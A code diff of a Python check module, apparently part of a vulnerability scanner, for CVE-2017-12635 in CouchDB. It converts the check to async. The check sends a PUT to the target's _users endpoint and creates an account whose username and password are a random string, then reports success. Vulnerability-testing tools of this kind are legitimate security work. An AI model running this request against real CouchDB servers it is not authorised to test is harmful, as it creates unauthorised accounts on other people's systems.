@@ -2,8 +2,8 @@
 
 import re
 import json
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta
+from app.lib.request import request
+from app.lib.common import get_capta
 
 class CVE_2017_12635_BaseVerify:
     def __init__(self, url):
@@ -28,7 +28,7 @@ class CVE_2017_12635_BaseVerify:
             "password": self.capta
         }
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -39,18 +39,13 @@ class CVE_2017_12635_BaseVerify:
         """
         
         try:
-            req = request.put(self.url + "/_users/org.couchdb.user:" + self.capta, data = self.data, headers = self.headers)
+            req = await request.put(self.url + "/_users/org.couchdb.user:" + self.capta, data = self.data, headers = self.headers)
             self.headers["Content-Type"] = "application/x-www-form-urlencoded;charset=UTF-8"
-            if req.status_code == 201 and json.loads(req.text)['ok'] == True:
-                print("存在CVE-2017-12635漏洞,添加的账号和密码为:", self.capta, self.capta)
-                return True
-            else:
-                print("不存在CVE-2017-12635漏洞")
-                return False
+            if req.status == 201 and json.loads(await req.text())['ok'] == True:
+                # print("存在CVE-2017-12635漏洞,添加的账号和密码为:", self.capta, self.capta)
+                return True, "存在CVE-2017-12635漏洞,添加的账号和密码为:"  + self.capta + ':' + self.capta
         except Exception as e:
-            print("不存在CVE-2017-12635漏洞")
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
